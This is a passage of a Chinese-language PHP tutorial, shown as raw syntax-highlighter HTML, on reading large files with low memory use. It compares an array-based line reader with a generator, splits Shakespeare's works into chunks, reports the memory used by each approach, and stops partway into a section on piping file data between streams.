class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">round</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">precision</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-13\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-15\"><span class=\"crayon-e\">print </span><span class=\"crayon-e\">formatBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">memory_get_peak_usage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c95a178670323\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from reading-files-line-by-line-1.php\r\n\r\nfunction readTheFile($path) {\r\n    $lines = [];\r\n    $handle = fopen($path, \"r\");\r\n\r\n    while(!feof($handle)) {\r\n        $lines[] = trim(fgets($handle));\r\n    }\r\n\r\n    fclose($handle);\r\n    return $lines;\r\n}\r\n\r\nreadTheFile(\"shakespeare.txt\");\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95a178670323-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95a178670323-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-1\"><span class=\"crayon-c\">// from reading-files-line-by-line-1.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-3\"><span class=\"crayon-t\">function</span> <span class=\"crayon-e\">readTheFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-4\">    <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">lines</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-5\">    <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-7\">    <span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">feof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-8\">        <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">trim</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">fgets</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-9\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-11\">    <span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-12\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-13\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-15\"><span class=\"crayon-e\">readTheFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95a178670323-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95a178670323-17\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>我们读取一个文本文件为莎士比亚全集。文件大小为5.5MB，内存占用峰值为12.8MB。现在让我们用一个生成器来读取每一行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c95d953320714\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from reading-files-line-by-line-2.php\r\n\r\nfunction readTheFile($path) {\r\n    $handle = fopen($path, \"r\");\r\n\r\n    while(!feof($handle)) {\r\n        yield trim(fgets($handle));\r\n    }\r\n\r\n    fclose($handle);\r\n}\r\n\r\nreadTheFile(\"shakespeare.txt\");\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c95d953320714-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c95d953320714-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-1\"><span class=\"crayon-c\">// from reading-files-line-by-line-2.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-3\"><span class=\"crayon-t\">function</span> <span class=\"crayon-e\">readTheFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-4\">    <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-6\">    <span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">feof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-7\">        <span class=\"crayon-i\">yield</span> <span class=\"crayon-e\">trim</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">fgets</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-8\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-10\">    <span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-11\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-13\"><span class=\"crayon-e\">readTheFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c95d953320714-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c95d953320714-15\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>文本文件大小不变，但内存使用峰值只是393KB。即使我们能把读取到的数据做一些事情也并不意味着什么。也许我们可以在看到两条空白时把文档分割成块，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c961973798747\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from reading-files-line-by-line-3.php\r\n\r\n$iterator = readTheFile(\"shakespeare.txt\");\r\n\r\n$buffer = \"\";\r\n\r\nforeach ($iterator as $iteration) {\r\n    preg_match(\"/\\n{3}/\", $buffer, $matches);\r\n\r\n    if (count($matches)) {\r\n        print \".\";\r\n        $buffer = \"\";\r\n    } else {\r\n        $buffer .= $iteration . PHP_EOL;\r\n    }\r\n}\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c961973798747-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c961973798747-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-1\"><span class=\"crayon-c\">// from reading-files-line-by-line-3.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">iterator</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">readTheFile</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">buffer</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-7\"><span class=\"crayon-st\">foreach</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">iterator</span> <span class=\"crayon-st\">as</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">iteration</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-8\">    <span class=\"crayon-e\">preg_match</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/\\n{3}/\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">matches</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-10\">    <span class=\"crayon-st\">if</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">matches</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-11\">        <span class=\"crayon-i\">print</span> <span class=\"crayon-s\">\".\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-12\">        <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">buffer</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-13\">    <span class=\"crayon-sy\">}</span> <span class=\"crayon-st\">else</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-14\">        <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">buffer</span> <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">=</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">iteration</span> <span class=\"crayon-sy\">.</span> <span class=\"crayon-v\">PHP_EOL</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-15\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-16\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c961973798747-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c961973798747-18\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>猜到我们使用了多少内存吗？我们把文档分割为1216块，仍然只使用了459KB的内存，这是否让你惊讶？考虑到生成器的性质，我们使用的最多内存是使用在迭代中我们需要存储的最大文本块。在本例中，最大的块为101985字符。</p>\n<p>我已经撰写了<a href=\"https://www.sitepoint.com/memory-performance-boosts-with-generators-and-nikiciter/\" target=\"_blank\" rel=\"nofollow\">使用生成器提示性能</a>和<a href=\"https://github.com/nikic/iter\" target=\"_blank\" rel=\"nofollow\">Nikita Popov的迭代器库</a>，如果你感兴趣就去看看吧！</p>\n<p>生成器还有其它用途，但是最明显的好处就是高性能读取大文件。如果我们需要处理这些数据，生成器可能是最好的方法。</p>\n<h3>管道间的文件</h3>\n<p>在我们不需要处理数据的情况下，我们可以把文件数据传递到另一个文件。通常被称为管道（大概是因为我们看不到除了两端的管子里面，当然，它也是不透明的），我们可以通过使用流方法实现。让我们先写一个脚本从一个文件传到另一个文件。这样我们可以测量内存的占用情况：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c965158925643\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from piping-files-1.php\r\n\r\nfile_put_contents(\r\n    \"piping-files-1.txt\", 